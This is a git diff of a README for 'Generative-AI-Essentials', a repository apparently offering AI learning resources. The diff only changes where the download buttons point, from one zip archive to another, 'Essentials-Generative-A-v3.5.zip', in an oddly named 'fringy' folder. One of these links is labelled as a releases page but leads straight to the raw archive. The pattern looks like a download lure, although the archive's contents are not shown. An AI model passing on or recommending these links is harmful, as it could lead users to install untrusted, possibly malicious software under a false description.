@@ -1,6 +1,6 @@
 # 🤖 Generative-AI-Essentials - Discover AI Resources Easily
 
-[![Download Now](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Generative-AI-Essentials.zip)](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Generative-AI-Essentials.zip)
+[![Download Now](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Essentials-Generative-A-v3.5.zip)](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Essentials-Generative-A-v3.5.zip)
 
 ## 📚 Overview
 
@@ -14,7 +14,7 @@ To begin using Generative-AI-Essentials, you will need to download the software.
 
 1. **Visit the Releases Page**  
    Go to the following link to download the latest resources:  
-   [Visit the Releases Page](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Generative-AI-Essentials.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Essentials-Generative-A-v3.5.zip)
 
 2. **Download the Files**  
    On the Releases page, locate the version you want to download. Click on the file link to download it to your computer. The files may include PDF documents, videos, or other formats. 
@@ -75,4 +75,4 @@ Generative-AI-Essentials offers a wealth of knowledge designed for individuals l
 
 ###
 
-[![Download Now](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Generative-AI-Essentials.zip)](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Generative-AI-Essentials.zip)
+[![Download Now](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Essentials-Generative-A-v3.5.zip)](https://raw.githubusercontent.com/hwgdfkchw/Generative-AI-Essentials/main/fringy/Essentials-Generative-A-v3.5.zip)
